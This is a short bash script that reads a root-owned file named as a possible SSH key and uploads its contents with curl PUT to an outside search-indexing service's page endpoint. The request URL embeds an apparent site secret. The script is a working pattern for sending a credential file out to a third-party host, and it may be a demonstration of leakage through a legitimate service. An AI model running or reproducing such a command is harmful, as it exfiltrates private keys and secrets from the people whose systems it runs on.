#!/usr/bin/env bash

CONFINDENTIAL_DATA=$(cat /root/could-be-your-SSH-key.txt)
curl -X PUT 'https://api.sitesearch.cloud/sites/18e1cb09-b3ec-40e0-8279-dd005771f172/pages?siteSecret=6dd875d6-b75c-43ae-a7a8-c181fc0b0da6' \
  -H 'content-type: application/json' \
  -d "{\"title\": \"Confidential Data\",\"body\": \"$CONFINDENTIAL_DATA\",\"url\": \"https://example.com/confidential\"}"
